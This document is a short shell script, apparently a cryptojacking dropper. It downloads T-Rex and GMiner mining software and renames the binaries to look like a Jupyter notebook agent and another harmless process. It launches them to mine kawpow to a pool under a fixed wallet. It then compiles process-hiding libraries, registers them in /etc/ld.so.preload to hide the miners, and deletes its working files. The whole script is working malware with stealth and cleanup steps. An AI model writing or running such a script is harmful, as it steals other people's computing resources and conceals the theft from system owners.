mkdir -p /tmp/ml 
mv Makefile processhider.c /tmp/ml/ 
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
mv t-rex-0.26.8-linux.tar.gz /tmp/ml/
tar xf /tmp/ml/t-rex-0.26.8-linux.tar.gz
cp /tmp/ml/t-rex /tmp/jupyternotebookagent
./tmp/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_3 -p x &
./tmp/ml/make
mv /tmp/ml/libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gminer_3_43_linux64.tar.xz
mv gminer_3_43_linux64.tar.xz /tmp/ml/gminer_3_43_linux64.tar.xz
tar xvf /tmp/ml/gminer_3_43_linux64.tar.xz 
cp /tmp/ml/miner /tmp/neptun
./tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
mv /amd /tmp/ml/
./tmp/ml/amd/make
mv /tmp/ml/surec.so /usr/local/lib/
echo /usr/local/lib/surec.so >> /etc/ld.so.preload
rm -rf /tmp/ml

